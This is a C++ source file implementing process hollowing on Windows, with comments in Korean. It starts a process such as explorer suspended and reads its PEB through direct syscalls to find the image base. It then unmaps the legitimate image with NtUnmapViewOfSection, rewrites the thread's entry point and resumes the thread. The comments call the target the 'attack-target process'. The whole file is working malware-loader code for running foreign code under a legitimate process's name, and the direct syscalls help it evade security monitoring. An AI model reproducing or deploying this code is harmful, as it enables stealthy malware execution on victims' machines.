#include "process_.h"
#include "phnt.h"
#include "directsyscall.h"

process::process() : 
	check_Run(false),
	_thread(NULL),
	process_handle(NULL),
	_pthreadContext(NULL),
	process_handleImageBase(0)
{}

process::~process()
{
	if (!check_Run)
	{
		if (_thread != NULL)
		{
			CloseHandle(_thread);
			_thread = NULL;
		}

		if (process_handle != NULL)
		{
			CloseHandle(process_handle);
			process_handle = NULL;
		}

		if (_pthreadContext != NULL)
		{
			HeapFree(GetProcessHeap(), 0, _pthreadContext);
			_pthreadContext = NULL;
		}
	}
}

HANDLE process::handle()
{
	if (!check_Run)
		return NULL;

	return process_handle;
}

bool process::create(PWCHAR pwszProcessPath, bool bSuspended)//explorer
{
	STARTUPINFO start_info = { 0, };
	PROCESS_INFORMATION process_info = { 0, };
	ULONG CreateFlag = bSuspended == true ? CREATE_SUSPENDED : 0;
	NTSTATUS status = STATUS_SUCCESS;
	PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0, };
	PEB ProcessPeb = { 0, };
	ULONG ulProcessInfoLength = 0;
	SIZE_T ulPebLength = 0;

	start_info.cb = sizeof(STARTUPINFO); //생성 시 프로세스에 대한 기본 창의 창 스테이션, 데스크톱, 표준 핸들 및 모양을 지정

	if (!CreateProcess(NULL, pwszProcessPath, NULL, NULL, FALSE, CreateFlag, NULL, NULL, &start_info, &process_info)) //explorer 프로세스 일시정지 모드로 생성,process_info 프로세스 정보 획득
	{
		return false;
	}

	_thread = process_info.hThread;
	process_handle = process_info.hProcess;

	if (bSuspended)
		getThreadContext(); //GetThreadContext 를 통해 일시중지된 스레드 의 콘텍스트를 가져옴

	status = DirectNtQueryInformationProcess(
		process_handle,
		ProcessBasicInformation,
		&ProcessBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&ulProcessInfoLength
	); // NtQueryInformationProcess를 통해서도 peb 포인ㅌ ㅓ획득가능 (ProcessBasicInformation)

	if (status != STATUS_SUCCESS)
	{
		return false;
	}

	status = DirectNtReadVirtualMemory(
		process_handle,
		(PVOID)ProcessBasicInfo.PebBaseAddress,
		&ProcessPeb,
		sizeof(ProcessPeb),
		(PULONG)&ulPebLength
	);//peb 포인ㅌ ㅓ

	if (status != STATUS_SUCCESS)
	{
		return false;
	}

	process_handleImageBase = (ULONG_PTR)ProcessPeb.ImageBaseAddress;// PEB 주소 파악 후 PEB.IMAGEBaseAddress 를 읽어 실행파일의 기준주소 파악 

	check_Run = true;

    return true;
}

ULONG_PTR process::imagebase()
{
	return process_handleImageBase;
}

bool process::unmap(ULONG_PTR imagebase)
{
	NTSTATUS status = STATUS_SUCCESS;

	status = DirectNtUnmapViewOfSection(process_handle, (PVOID)imagebase);//공격대상 프로세스 실행 파일의 주소 파악 시 NtunMapviewofSection api를 통하여 정상 프로세스의 실행 파일 섹션을 해제

	if (status != STATUS_SUCCESS)
	{
		return false;
	}

	return true;
}

bool process::patchEntryPoint(ULONG_PTR baseAddress, ULONG_PTR addressOfEntryPoint)
{
	/*#ifdef _M_IX86
		_pthreadContext->Eax = baseAddress + addressOfEntryPoint;
	#else
		_pthreadContext->Rcx = baseAddress + addressOfEntryPoint;
	#endif
	*/
	_pthreadContext->Rcx = baseAddress + addressOfEntryPoint;

	if (SetThreadContext(_thread, _pthreadContext))
		return true;

	return false;
}

void process::resume()
{
	ResumeThread(_thread);
	WaitForSingleObject(_thread, INFINITE);
}


bool process::getThreadContext()
{
	_pthreadContext = (LPCONTEXT)HeapAlloc(GetProcessHeap(), 0, sizeof(CONTEXT));

	if (_pthreadContext == NULL)
		return false;

	memset(_pthreadContext, 0, sizeof(CONTEXT));

	_pthreadContext->ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(_thread, _pthreadContext))
	{
		return false;
	}	

	return true;
}

